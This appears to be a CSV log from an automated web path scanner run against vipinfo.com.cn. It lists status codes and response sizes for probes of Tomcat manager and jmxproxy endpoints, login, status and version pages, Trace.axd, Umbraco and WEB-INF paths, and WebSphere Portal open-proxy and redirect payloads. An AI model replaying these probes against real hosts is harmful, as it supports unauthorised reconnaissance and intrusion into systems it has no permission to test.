Column1,Column2,Column3,Column4,Column5,Column6,Column7,Column8,Column9,Column10,Column11,Column12,Column13,Column14,Column15
403,,,721B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=.php,,,,,,,,,,
403,,,655B,http://www.vipinfo.com.cn/manager/login.aspx,,,,,,,,,,
403,,,654B,http://www.vipinfo.com.cn/manager/login.htm,,,,,,,,,,
403,,,655B,http://www.vipinfo.com.cn/manager/login.html,,,,,,,,,,
403,,,654B,http://www.vipinfo.com.cn/manager/login.jsp,,,,,,,,,,
403,,,659B,http://www.vipinfo.com.cn/manager/status/all.php,,,,,,,,,,
403,,,725B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS.aspx,,,,,,,,,,
403,,,660B,http://www.vipinfo.com.cn/manager/status/all.aspx,,,,,,,,,,
403,,,709B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE.aspx,,,,,,,,,,
403,,,654B,http://www.vipinfo.com.cn/manager/login.php,,,,,,,,,,
403,,,655B,http://www.vipinfo.com.cn/manager/status/all,,,,,,,,,,
403,,,706B,http://www.vipinfo.com.cn/manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY.aspx,,,,,,,,,,
403,,,659B,http://www.vipinfo.com.cn/manager/status/all.asp,,,,,,,,,,
403,,,656B,http://www.vipinfo.com.cn/manager/VERSION.asp,,,,,,,,,,
403,,,653B,http://www.vipinfo.com.cn/manager/VERSION/,,,,,,,,,,
403,,,659B,http://www.vipinfo.com.cn/manager/status/all.htm,,,,,,,,,,
403,,,708B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE.jsp,,,,,,,,,,
403,,,657B,http://www.vipinfo.com.cn/manager/VERSION.html,,,,,,,,,,
403,,,654B,http://www.vipinfo.com.cn/manager/login.asp,,,,,,,,,,
403,,,656B,http://www.vipinfo.com.cn/manager/VERSION.htm,,,,,,,,,,
403,,,656B,http://www.vipinfo.com.cn/manager/VERSION.php,,,,,,,,,,
403,,,651B,http://www.vipinfo.com.cn/manager/login/,,,,,,,,,,
403,,,659B,http://www.vipinfo.com.cn/manager/status/all.jsp,,,,,,,,,,
403,,,660B,http://www.vipinfo.com.cn/manager/status/all.html,,,,,,,,,,
403,,,652B,http://www.vipinfo.com.cn/manager/VERSION,,,,,,,,,,
403,,,657B,http://www.vipinfo.com.cn/manager/VERSION.aspx,,,,,,,,,,
403,,,656B,http://www.vipinfo.com.cn/manager/VERSION.jsp,,,,,,,,,,
200,,,,5KB,http://www.vipinfo.com.cn/market.html,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/rating_over.,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/service.asmx,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/static..,,,,,,,,,
403,,,,2KB,http://www.vipinfo.com.cn/Trace.axd,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/umbraco/webservices/codeEditorSave.asmx,,,,,,,,,
403,,,,1KB,http://www.vipinfo.com.cn/uploads/,,,,,,,,,
403,,,,1KB,http://www.vipinfo.com.cn/uploads,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/WEB-INF./,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/WebResource.axd?d=LER8t9aS,,,,,,,,,
403,,,764B,http://www.vipinfo.com.cn/wps/common_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,,,,,,,,,,
403,,,809B,http://www.vipinfo.com.cn/wps/contenthandler/!ut/p/digest!8skKFbWr_TwcZcvoc9Dn3g/?uri=http://www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,,,,,,,,,,
403,,,762B,http://www.vipinfo.com.cn/wps/cmis_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,,,,,,,,,,
403,,,759B,http://www.vipinfo.com.cn/wps/myproxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,,,,,,,,,,
403,,,757B,http://www.vipinfo.com.cn/wps/proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,,,,,,,,,,
